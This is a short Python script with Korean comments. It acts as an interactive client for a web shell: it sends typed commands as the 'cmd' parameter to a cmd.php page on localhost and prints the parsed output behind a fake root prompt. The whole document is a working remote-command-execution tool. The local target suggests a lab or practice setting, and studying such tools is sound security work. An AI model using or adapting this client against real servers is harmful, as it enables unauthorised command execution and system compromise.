import requests
from bs4 import BeautifulSoup

url = 'http://127.0.0.1/cmd.php'

while True:
    cmd = input('[root@localhost ~$] ')
    params = {'cmd': cmd}

    if cmd ==  'exit':
        break

    html = requests.get(url, params)  # html get 요청
    soup = BeautifulSoup(html.text, 'html.parser')  # html 태그 파싱
    print(soup.text)  # pre 태그 안 내용만 출력